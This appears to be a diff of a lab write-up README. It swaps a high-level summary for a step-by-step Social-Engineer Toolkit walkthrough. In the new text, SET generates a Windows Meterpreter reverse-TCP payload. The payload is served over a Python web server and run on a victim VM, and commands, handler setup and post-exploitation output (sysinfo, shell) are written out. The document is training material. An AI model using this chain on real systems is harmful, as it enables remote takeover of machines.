@@ -1,92 +1,129 @@
-# Social Engineering Toolkit (SET) – Authorized Lab
+# Hands-on: Social Engineering Toolkit (SET)
 
-**Status:** Authorized educational exercise conducted in a fully isolated laboratory environment.
+A step-by-step lab demonstrating how to use the **Social-Engineer Toolkit (SET)** on Kali Linux to generate a Windows payload, host it, and receive a **Meterpreter** session through **Metasploit**, between an attacker VM and a victim VM.
 
-## Objective
-
-Demonstrate how social-engineering attack vectors work in a controlled setting so that defensive controls and user-awareness measures can be better understood and improved.
+> ⚠️ **For authorised training and educational use only.** Everything below is performed in an isolated lab between virtual machines you own. Deploying payloads against systems you do not own or lack explicit written permission to test is illegal.
 
 ## Lab Environment
 
-- Two isolated virtual machines:
-  - **Attacker machine** – runs the Social Engineering Toolkit (SET)
-  - **Victim machine** – represents the target endpoint
-- Full network isolation and VM snapshots used throughout
-- All activity performed under explicit authorization
+| Role | Machine | IP (example) |
+| --- | --- | --- |
+| Attacker | Kali Linux (VMware) | `192.168.40.129` |
+| Victim | Windows 10 x64 (VMware) | `192.168.40.131` |
 
-## High-Level Process
+## Prerequisites
 
-### 1. Attacker machine preparation
+- Kali Linux with SET and Metasploit installed
+- A Windows VM on the same host-only / NAT network
+- Both machines able to reach each other (verify with `ping`)
 
-The Social Engineering Toolkit is launched on the designated attacker system. An attack vector is selected (commonly a website clone / credential-harvesting page or a payload-delivery option). The toolkit is configured so that successful interaction from the victim side produces a visible callback or session notification on the attacker console.
+---
 
-![SET interface](media/image1.png)
+## 1. Launching SET
 
-![SET menu / configuration](media/image2.jpeg)
+Open the Kali application menu, search for `set`, and select **social engineering toolkit (root)**.
 
-![SET options](media/image3.jpeg)
+![Launching SET from the Kali menu](images/01-launch-set.png)
 
-![SET configuration screen](media/image4.png)
+SET loads and shows its banner and main menu. Type a number to select an option — start with **option 1 (Social-Engineering Attacks)**.
 
-![Additional SET settings](media/image5.jpeg)
+![SET main menu](images/02-set-menu.png)
 
-![Payload / attack vector setup](media/image6.jpeg)
+## 2. Selecting the Attack Vector
 
-![Listener or delivery configuration](media/image7.png)
+From the Social-Engineering Attacks menu, choose **option 4 (Create a Payload and Listener)**.
 
-![Status / progress indicator](media/image8.jpeg)
+![Social-Engineering Attacks menu](images/03-attack-menu.png)
 
-![Configuration summary](media/image9.jpeg)
+SET lists the available payloads. Choose one — for example **option 5 (Windows Meterpreter Reverse_TCP X64)** — then, when prompted for `LHOST`, enter the attacker's IP address.
 
-### 2. Switch to the victim machine
+```text
+set:payloads> 5
+set:payloads> IP address for the payload listener (LHOST): 192.168.40.129
+```
 
-Control is moved to a second virtual machine that represents the target endpoint. This machine is used only to simulate the actions a real user might take (for example, visiting a crafted link or interacting with delivered content).
+![Payload list and LHOST prompt](images/04-payload-list.png)
 
-![Switching to victim machine](media/image11.png)
+## 3. Setting the Port and Generating the Payload
 
-*Representing the victim machine.*
+Enter a port for the reverse listener (a random port, for example `1001`). SET generates the payload and exports it to the default SET directory. Listing the directory confirms `payload.exe` is present.
 
-![Victim machine view](media/image10.jpeg)
+```text
+set:payloads> Enter the PORT for the reverse listener: 1001
+[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
+```
 
-### 3. Simulated victim interaction
+![Payload generated in /root/.set](images/05-payload-generated.png)
 
-On the victim machine the operator performs the actions that would trigger the chosen social-engineering vector. Because the lab is fully isolated, this interaction stays inside the controlled environment.
+## 4. Hosting the Payload
 
-### 4. Attacker-side confirmation
+Set up a simple web server from the SET directory so the victim can download the payload:
 
-The attacker console receives a clear indication that the payload or session is active. This confirms that the delivery path worked as expected inside the lab and allows the operator to observe the resulting session or harvested data (again, only within the isolated environment).
+```bash
+cd /root/.set
+python3 -m http.server 80
+```
 
-**The attacker will know when the payload is running.**
+![Simple HTTP server hosting the payload](images/06-http-server.png)
 
-![Payload active / session notification](media/image12.png)
+Type `yes` to start the payload and listener. Metasploit launches and configures the `multi/handler` with the matching payload, `LHOST`, and `LPORT`; the handler then waits for a connection from the victim machine.
 
-![Session details](media/image13.png)
+![Metasploit handler waiting for a connection](images/07-handler-waiting.png)
 
-![Additional confirmation / results](media/image14.png)
+## 5. The Victim Downloads the Payload
 
-![Final session / harvested data view](media/image15.png)
+Switch to the victim machine. In its browser, enter the attacker's IP address to reach the hosted directory listing, then download `payload.exe` — representing the victim clicking a malicious link.
 
-### 5. Documentation and cleanup
+![Victim browsing the directory listing](images/08-victim-download.png)
 
-Screenshots of the SET interface, the victim-side interaction, and the successful callback are captured for the lab report. Virtual machines are then reverted to clean snapshots, ensuring no residual artifacts remain.
+## 6. Receiving the Meterpreter Session
 
-## Key Observations
+When the payload runs, the handler receives the connection and a **Meterpreter session** opens.
 
-- The attacker can immediately see when the simulated payload becomes active.
-- Social-engineering success depends heavily on user interaction rather than pure technical exploitation.
-- The same techniques that succeed in a lab can be detected and mitigated in real environments through layered defenses.
+![Meterpreter session opened](images/09-session-opened.png)
 
-## Defensive Takeaways
+Several sessions may open, but only one is needed. Interact with a session using:
 
-- User-awareness training remains one of the most effective controls.
-- Technical mitigations such as multi-factor authentication, email/web filtering, application allow-listing, and endpoint detection can interrupt many of these vectors.
-- Network segmentation and least-privilege principles limit the impact of any successful social-engineering attempt.
-- Regular authorized testing in controlled labs helps organizations identify gaps before real adversaries do.
+```text
+sessions -i 1
+```
+
+![Interacting with a session](images/10-sessions-interact.png)
+
+## 7. Post-Exploitation
+
+With the session established, commands can be run on the victim machine. Use `sysinfo` to learn the OS and system details:
+
+```text
+meterpreter > sysinfo
+Computer        : DESKTOP-VO5Q4NI
+OS              : Windows 10 (10.0 Build 19045).
+Architecture    : x64
+System Language : en_GB
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+```
+
+![sysinfo output](images/11-sysinfo.png)
+
+Drop into a native shell to run standard Windows commands, for example listing the Downloads folder:
+
+```text
+meterpreter > shell
+C:\Users\freef\Downloads> dir
+```
+
+![Native Windows shell listing the Downloads folder](images/12-shell-dir.png)
+
+---
+
+## Key Takeaways
+
+- SET automates payload creation and listener setup, lowering the barrier to a working attack chain.
+- Delivery still relies on **social engineering** — the victim has to be persuaded to download and run the file.
+- Defensive lessons: don't run untrusted executables, watch for unexpected outbound connections, and use endpoint protection and network monitoring.
 
 ## Disclaimer
 
-All activities described in this repository were performed in an isolated laboratory environment under explicit authorization.  
-
-The techniques demonstrated must **never** be used against systems or individuals without prior written permission.  
-
-This write-up is intended solely for educational and defensive purposes.
+This material is provided strictly for learning and authorised testing. The author accepts no liability for misuse. Always obtain explicit permission before testing any system.
